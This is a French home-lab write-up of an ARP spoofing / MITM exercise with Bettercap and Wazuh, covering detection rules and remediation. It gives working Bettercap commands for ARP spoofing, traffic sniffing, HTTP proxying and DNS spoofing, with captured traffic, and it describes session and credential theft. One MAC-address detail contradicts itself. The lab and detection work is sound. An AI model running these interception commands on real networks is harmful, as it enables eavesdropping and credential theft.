# Rapport de Projet — Home Lab SOC (Wazuh + Bettercap) — Partie 4
## Scénario offensif : ARP Spoofing / MITM — Attaque, Détection et Remédiation

**Auteur :** Grim Jow
**Date :** Août 2026
**Suite de :** Rapports 1, 2 et 3 (construction du lab, correction des agents, tunnel Tailscale)

---

## 1. Objectif de cette session

Après la clôture de la phase de construction (Rapport 3), cette session met en œuvre le **premier scénario offensif réel** défini dans la feuille de route : une attaque **ARP Spoofing / MITM**, exécutée depuis Kali/Parrot, avec pour objectifs :

1. Comprendre et documenter pourquoi ce type d'attaque ne peut pas fonctionner via le tunnel Tailscale.
2. Adapter l'architecture du lab pour rendre l'attaque possible.
3. Configurer Wazuh pour détecter l'attaque en temps réel (authentification SSH, intégrité des fichiers, table ARP).
4. Exécuter l'attaque, analyser les données interceptées, et appliquer une contre-mesure de remédiation.

---

## 2. Tentative n°1 : ARP Spoofing via le tunnel Tailscale (échec)

### 2.1 Mise en place

```bash
sudo bettercap -iface tailscale0
```

```
net.probe on
net.show
```

### 2.2 Résultat observé

Aucun autre appareil du lab (Manager, Ubuntu) n'apparaissait dans la découverte réseau de Bettercap via l'interface `tailscale0`.

### 2.3 Analyse de la cause

Le protocole **ARP** repose par nature sur la diffusion (**broadcast**) au sein d'un même domaine de diffusion local (Layer 2). Or les réseaux **overlay** comme Tailscale fonctionnent par **routage point à point chiffré** et bloquent délibérément les signaux de broadcast direct de couche 2, pour des raisons de sécurité et d'architecture. En conséquence, **le protocole ARP ne peut pas être empoisonné à travers un tunnel Tailscale** — il n'existe tout simplement pas de table ARP partagée à ce niveau.

**Conclusion :** Tailscale reste pertinent pour des scénarios de couche 3 (attaques web, malware, exfiltration), mais est structurellement incompatible avec les attaques de couche 2 comme l'ARP Spoofing. Il faut donc revenir à une topologie où les machines partagent un **switch virtuel physique commun**.

---

## 3. Mise en place d'une machine victime dédiée : Debian 13 (VMware)

### 3.1 Choix technique

Une VM **Debian 13** sans interface graphique a été installée sous VMware, à côté de Kali, pour servir de cible à l'attaque ARP Spoofing dans un premier temps.

### 3.2 Problème rencontré : absence d'alertes SSH malgré un agent actif

L'agent Wazuh sur Debian apparaissait bien **Active** dans le Dashboard et envoyait normalement les événements FIM et Rootcheck, mais **aucune alerte de tentative de connexion SSH échouée** n'apparaissait.

### 3.3 Diagnostic

Deux causes ont été identifiées :

1. **Absence du fichier `/var/log/auth.log`** : les distributions Linux modernes comme Debian 13 n'écrivent plus systématiquement les logs d'authentification dans ce fichier traditionnel ; ils sont désormais centralisés dans le **journal systemd** (`journald`).
2. **Chemin de surveillance obsolète côté agent** : l'agent Wazuh était configuré pour lire un chemin de log par défaut qui ne correspondait plus à l'emplacement réel des journaux d'authentification.

### 3.4 Solution appliquée

**Étape 1 — Configuration de rsyslog pour recréer le fichier `auth.log` :**

Dans `/etc/rsyslog.conf`, décommenter la ligne de redirection des logs d'authentification :

```
auth,authpriv.*   /var/log/auth.log
```

Redémarrage du service :

```bash
systemctl restart rsyslog
```

**Étape 2 — Configuration de l'agent Wazuh (`ossec.conf`) :**

```xml
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/auth.log</location>
</localfile>
```

```bash
systemctl restart wazuh-agent
```

### 3.5 Vérification et preuve de fonctionnement

**Test de génération d'événements :** tentatives de connexion SSH volontairement erronées depuis Kali Linux vers Debian.

**Validation locale :**

```bash
grep "Failed password" /var/log/auth.log
```

Les échecs d'authentification apparaissent bien dans le fichier local.

**Détection SIEM (Wazuh Dashboard — Threat Hunting) :**

| Rule ID | Description | Niveau de sévérité | Tactique MITRE |
|---|---|---|---|
| 2502 | Répétition de mots de passe erronés (`syslog: User missed the password more than one time`) | 10 | Credential Access — T1110 |
| 5503 | Échec d'authentification PAM (`PAM: User login failed`) | 5 | — |

✅ **Résultat :** la détection des tentatives de brute-force SSH est pleinement opérationnelle sur Debian 13.

---

## 4. Vérification complémentaire : surveillance d'intégrité des fichiers (FIM)

### 4.1 Objectif

Vérifier que le Manager dispose d'une vision complète sur les modifications de fichiers système sensibles (protection contre l'altération de la configuration, ex. `resolv.conf`).

### 4.2 Configuration appliquée

Dans `ossec.conf` :

```xml
<syscheck>
  <directories check_all="yes">/etc,/usr/bin,/usr/sbin,/bin,/sbin,/boot</directories>
</syscheck>
```

L'option `scan_on_start` a été activée pour garantir un scan complet dès le démarrage du service.

### 4.3 Test et résultat

**Simulation :** modification volontaire d'un fichier de test (`/etc/wazuh-test-alert.txt`) et d'un fichier système sensible (`/etc/resolv.conf`).

**Détection SIEM :**

| Rule ID | Description | Niveau de sévérité |
|---|---|---|
| 550 | Modification de l'empreinte d'intégrité (`Integrity checksum changed`) | 7 |

✅ **Résultat :** le Dashboard *Integrity Monitoring* affiche précisément le chemin du fichier modifié (`syscheck.path`), le type d'opération (`modified`) et l'horodatage exact.

---

## 5. Tentative n°2 : ARP Spoofing sur VMware (échec de topologie)

### 5.1 Problème rencontré : « Could not find spoof targets »

Malgré la découverte correcte des appareils sur le réseau, Bettercap refusait de cibler les hôtes, en raison de l'**isolation du réseau NAT virtuel de VMware**, qui empêche les modifications de couche 2 (ARP) entre machines.

### 5.2 Tentative de correction : passage en mode Host-only

Le changement du type de carte réseau VMware en mode **Host-only** a permis en théorie une communication directe de couche 2, mais a eu pour effet secondaire de faire basculer les interfaces réseau locales en état **STATE DOWN**, coupant l'accès à Internet.

### 5.3 Conflit structurel identifié

- Le tunnel **Tailscale** est indispensable pour maintenir la remontée des alertes Wazuh (FIM, échecs d'authentification) vers le Manager.
- Les outils d'ARP Spoofing comme **Bettercap** ne peuvent pas fonctionner sur une interface VPN virtuelle (`tailscale0`), car celle-ci ne dispose pas d'une véritable table ARP locale vers une passerelle physique.
- **Conséquence :** passer en Host-only résolvait le problème d'attaque mais coupait Tailscale (donc les alertes Wazuh) ; garder Tailscale actif empêchait l'attaque ARP.

### 5.4 Décision d'architecture finale

Pour lever ce conflit sans compromis, **l'environnement de travail a été entièrement unifié dans Hyper-V** :

| Rôle | Machine |
|---|---|
| Wazuh Manager | Rocky Linux |
| Attaquant | Parrot OS |
| Victime | Ubuntu Server |

Toutes les machines ont été placées sur le **même switch virtuel direct**, garantissant à la fois le succès des attaques de couche 2 et la continuité du flux d'alertes Wazuh, sans dépendance à un tunnel overlay.

---

## 6. Configuration de la détection ARP côté Wazuh

### 6.1 Côté agent (Ubuntu — victime)

Ajout dans `ossec.conf` d'une commande périodique de surveillance de la table ARP :

```xml
<localfile>
  <log_format>full_command</log_format>
  <command>arp -an</command>
  <frequency>30</frequency>
</localfile>
```

```bash
sudo systemctl restart wazuh-agent
```

Cette commande exécute `arp -an` toutes les 30 secondes et transmet le résultat au Manager.

### 6.2 Côté Manager — règle de détection personnalisée

Dans `/var/ossec/etc/rules/local_rules.xml` :

```xml
<group name="network_anomaly,">
  <rule id="100020" level="12">
    <if_sid>530</if_sid>
    <match>arp -an</match>
    <check_diff />
    <description>Security Alert: Changes detected in the ARP table on the victim host (Potential ARP Spoofing attack)!</description>
  </rule>
</group>
```

La directive `<check_diff />` permet à Wazuh de comparer chaque nouvelle sortie de commande avec la précédente et de déclencher une alerte de **niveau 12** (sévérité élevée) dès qu'un changement est détecté dans la table ARP.

```bash
sudo systemctl restart wazuh-manager
```

---

## 7. Exécution de l'attaque ARP Spoofing / MITM

### 7.1 Lancement de Bettercap depuis Parrot OS

```bash
sudo bettercap -iface eth0
```

Découverte des hôtes du réseau :

```
net.probe on
```

**Extrait des logs (preuve) :**

```
[19:00:26] endpoint.new] endpoint 192.168.56.46 detected as 00:15:5d:00:b7:26 (Microsoft Corporation).
[19:00:26] endpoint 192.168.56.52 detected as 00:15:5d:00:b7:1e (Microsoft Corporation).
[19:00:26] endpoint 192.168.56.26 detected as 00:15:5d:00:b7:12 (Microsoft Corporation).
```

### 7.2 Configuration et lancement du spoofing

```
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.56.26
arp.spoof on
net.sniff on
```

```
[19:00:26] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
[19:00:26] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
```

✅ **Résultat :** l'attaque cible avec succès Ubuntu Server (`192.168.56.26`), avec interception bidirectionnelle du trafic (`fullduplex`).

---

## 8. Attaques secondaires exploitant la position MITM

### 8.1 SSL/TLS Stripping (tentative de rétrogradation HTTPS → HTTP)

**Activation :**

```
set net.sniff.websocket true
http.proxy on
```

```
[19:04:00] [sys.log] [inf] http.proxy started on 192.168.56.47:8080 (sslstrip disabled)
```

**Donnée interceptée (preuve) :**

```
[19:04:55] [net.sniff.http.request] http 192.168.56.26 POST controlplane.tailscale.com:80/ts2021

POST /ts2021 HTTP/1.1
Host: controlplane.tailscale.com:80
User-Agent: Go-http-client/1.1
X-Tailscale-Handshake: AIoBAGCzydhgpCB1PSs!!!!!!!!!!!!!!!!!!!!!!...
```

Le SNI (Server Name Indication) transmis en clair a également été capturé, révélant les services externes contactés par la victime même à travers une connexion chiffrée :

```
[19:04:56] [net.sniff.https] sni 192.168.56.26 > https://controlplane.tailscale.com
```

**Analyse :** même sans casser réellement le chiffrement TLS, la position MITM permet à l'attaquant d'observer :
- Les métadonnées de connexion (User-Agent, méthode HTTP, hôte de destination).
- Un jeton de handshake transmis en clair sur une requête HTTP non chiffrée.
- La liste des domaines contactés via le SNI, offrant une cartographie des services externes utilisés par la machine cible.

**Risque documenté :** un tel jeton, s'il est réutilisable, pourrait permettre une usurpation de session (*token hijacking*).

Bettercap a également capturé du trafic **mDNS/ZeroConf** annexe sur le réseau local (requêtes `_googlecast._tcp.local`), illustrant la richesse des informations exposées passivement lors d'une attaque MITM active.

### 8.2 DNS Spoofing

**Configuration :**

```
set dns.spoof.domains target-site.local
set dns.spoof.address 192.168.56.47
dns.spoof on
```

```
[19:21:48] [sys.log] [inf] dns.spoof target-site.local -> 192.168.56.47
```

**Principe :** toute résolution DNS demandée par Ubuntu pour le domaine ciblé est interceptée et redirigée vers l'adresse IP de l'attaquant (`192.168.56.47`), qui peut y héberger une fausse page de connexion (Apache ou serveur Python) pour capturer des identifiants.

### 8.3 Session Hijacking (vol de session)

**Principe appliqué :** avec `net.sniff on` actif, Bettercap recherche automatiquement les cookies et identifiants visibles dans le trafic intercepté. Les paquets peuvent également être exportés au format `.pcap` pour une analyse approfondie ultérieure dans Wireshark, permettant l'extraction de cookies de session actifs.

---

## 9. Remédiation : protection de la table ARP côté victime

### 9.1 Constat de la compromission

Sur Ubuntu Server, la table ARP a été examinée :

```bash
ip route show | grep default
arp -an
```

```
default via 192.168.56.1 dev eth0 proto dhcp src 192.168.56.26 metric 100
? (192.168.56.1) at 00:15:5d:00:b7:19 [ether] on eth0
```

**Constat critique :** l'adresse MAC associée à la passerelle (`192.168.56.1`) correspondait en réalité à celle de l'attaquant (`192.168.56.47`) — preuve directe que l'empoisonnement ARP avait bien détourné le trafic destiné à la passerelle légitime.

### 9.2 Contre-mesure : entrée ARP statique

Pour empêcher toute usurpation future de la passerelle, une entrée ARP statique et permanente a été appliquée sur Ubuntu :

```bash
sudo arp -s 192.168.56.1 00:15:5d:00:b7:19
```

*(Adresse MAC légitime de la passerelle, restaurée après arrêt de l'attaque.)*

**Vérification :**

```bash
arp -an
```

```
? (192.168.56.1) at 00:15:5d:00:b7:19 [ether] PERM on eth0
```

✅ Le flag `PERM` confirme que l'entrée est désormais figée en dur et ne peut plus être écrasée par une réponse ARP frauduleuse.

---

## 10. Recommandations de durcissement (synthèse défensive)

### 10.1 Sécurité au niveau hôte

- **Chiffrement systématique** : imposer SSH avec des standards modernes (désactivation des méthodes d'authentification faibles) et HTTPS exclusivement pour les services web, via des certificats de confiance.
- **HSTS** : activer l'en-tête `Strict-Transport-Security` sur les applications web pour empêcher tout retour forcé vers HTTP non chiffré.

### 10.2 Sécurité DNS et fichiers système

- **DoH / DoT** : router les requêtes DNS via DNS-over-HTTPS ou DNS-over-TLS pour empêcher leur interception ou manipulation en transit.
- **Protection du fichier `/etc/hosts`** :
  ```bash
  sudo chmod 644 /etc/hosts
  sudo chown root:root /etc/hosts
  ```

### 10.3 Détection et surveillance continue (Wazuh)

- Surveillance des changements anormaux dans les tables ARP et de routage via FIM et règles personnalisées (comme la règle `100020` mise en œuvre dans ce rapport).
- Exploitation des règles réseau natives de Wazuh (ex. **Rule 533**, détection de changements de ports ouverts / écoute inattendue de services).
- Intégration d'outils de supervision en temps réel des processus générant un trafic anormal ou effectuant des scans réseau, pour donner à l'équipe défensive (*Blue Team*) une capacité de détection dès les phases de reconnaissance de l'attaquant.

**Point clé du rapport :** la détection précoce de l'ARP Spoofing via la règle `100020` est la ligne de défense critique — elle permet de couper court à l'attaque avant même qu'elle ne progresse vers les étapes plus dangereuses de SSL Stripping ou de DNS Spoofing.

---

## 11. Synthèse des problèmes et solutions (session du jour)

| Problème | Cause racine | Solution appliquée |
|---|---|---|
| ARP Spoofing impossible via Tailscale | Les réseaux overlay routent le trafic et bloquent le broadcast de couche 2 nécessaire à ARP | Abandon de Tailscale pour ce scénario, recours à une topologie de couche 2 partagée |
| Aucune alerte SSH sur l'agent Debian 13 malgré un statut Actif | `/var/log/auth.log` absent (logs redirigés vers `journald`) ; chemin de surveillance de l'agent obsolète | Reconfiguration de `rsyslog` pour recréer `auth.log` + mise à jour de `ossec.conf` |
| « Could not find spoof targets » sur VMware | Isolation du NAT virtuel VMware empêchant les modifications de couche 2 | Passage testé en Host-only (insuffisant, coupe Internet) |
| Conflit entre attaque ARP et connectivité Tailscale | Bettercap incompatible avec les interfaces VPN virtuelles (pas de table ARP réelle sur `tailscale0`) | Unification complète de l'environnement dans Hyper-V (Manager, attaquant, victime sur le même switch virtuel) |
| Détection de l'ARP Spoofing | Absence de règle native adaptée | Création de la règle personnalisée `100020` (surveillance `arp -an` + `check_diff`) |
| Table ARP compromise après l'attaque | Passerelle usurpée par l'adresse MAC de l'attaquant | Fixation d'une entrée ARP statique (`arp -s`) sur la victime |

---

## 12. État du lab et prochaines étapes

✅ Premier scénario offensif complet réalisé de bout en bout : **reconnaissance → attaque ARP Spoofing → interception (SSL stripping, DNS spoofing, session hijacking) → détection SIEM → remédiation**.

✅ Chaîne de détection Wazuh validée sur trois plans : authentification (Rules 2502/5503), intégrité des fichiers (Rule 550), anomalies réseau (Rule personnalisée 100020).

**Prochaines étapes envisagées :**
1. Étendre les tests aux scénarios de la feuille de route (Rapport 3) restants : DoS/DDoS (SYN Flood), attaques web (SQLi/XSS), malware/post-exploitation (Meterpreter, FIM), Wi-Fi (Evil Twin).
2. Formaliser des tableaux de bord Wazuh dédiés par famille d'attaque pour le portfolio.
3. Explorer le rôle prévu pour Proxmox, encore non intégré au lab.

---

*Rapport rédigé dans le cadre du projet personnel de Home Lab SOC, destiné au portfolio GitHub — suite directe des Rapports 1, 2 et 3.*
